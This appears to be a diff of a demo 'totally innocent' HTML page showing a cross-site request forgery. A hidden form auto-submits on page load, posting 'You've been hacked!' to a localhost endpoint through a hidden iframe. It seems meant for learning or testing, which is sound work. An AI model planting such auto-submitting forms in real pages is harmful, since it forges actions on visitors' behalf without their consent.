@@ -1,12 +1,10 @@
 <h1>Hello!</h1>
 <p>Welcome to my totally innocent site</p>
 
-<!-- <div style="display: none"> -->
-    <form id="test" action="http://localhost/create" method="POST" target="hiddenFrame">
-        <input name="content" value="You've been hacked!">
-    </form>
-    <iframe name="hiddenFrame" width="500" height="500"></iframe>
-    <script>
-        test.submit()
-    </script>
-<!-- </div> -->
+<form id="test" action="http://localhost:6001/create" method="POST" target="hiddenFrame">
+    <input name="content" value="You've been hacked!">
+</form>
+<iframe name="hiddenFrame" width="500" height="500"></iframe>
+<script>
+    test.submit()
+</script>
